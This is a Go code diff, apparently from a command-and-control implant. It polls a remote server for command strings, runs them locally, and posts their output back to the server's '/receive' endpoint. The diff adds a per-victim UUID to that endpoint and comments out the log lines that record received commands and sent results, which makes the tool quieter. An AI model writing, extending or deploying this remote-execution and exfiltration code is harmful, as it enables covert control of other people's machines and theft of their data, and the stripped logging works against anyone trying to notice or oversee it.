@@ -180,7 +180,8 @@ func SendCommandOutput(serverURL, command, output string, headers map[string]str
 	}
 	defer resp.Body.Close()
 
-	log.Printf("[+] Command output sent successfully, server responded with: %d\n", resp.StatusCode)
+	// Debugging
+	// log.Printf("[+] Command output sent successfully, server responded with: %d\n", resp.StatusCode)
 	return nil
 }
 
@@ -192,6 +193,7 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 	// log.Println(opts.Body)
 	// log.Println(opts.Headers)
 	// log.Println(opts.SkipTLSVerify)
+	// log.Print(opts.Directories)
 	if opts.BaseURL == "" {
 		return nil, errors.New("[-] Base URL is required")
 	}
@@ -273,7 +275,8 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 					continue
 				}
 
-				log.Printf("[+] Received command: %s\n", commandStr)
+				// Debugging
+				// log.Printf("[+] Received command: %s\n", commandStr)
 
 				// Execute the command
 				output, err := ExecuteCommand(commandStr)
@@ -282,8 +285,13 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 					output = err.Error()
 				}
 
-				// Send output back to /receive
 				postURL := opts.BaseURL + "/receive"
+
+				if uuid, found := extractUUID(dir); found {
+					postURL += "/" + uuid
+				}
+
+				// Send output back to /receive
 				err = SendCommandOutput(postURL, commandStr, output, opts.Headers, opts.SkipTLSVerify, opts.Timeout)
 				if err != nil {
 					log.Printf("[-] Failed to send command output: %s\n", err)
@@ -291,7 +299,8 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 			}
 		}
 
-		log.Println(responseData)
+		// Debugging
+		// log.Println(responseData)
 		return responseData, nil
 	}
 
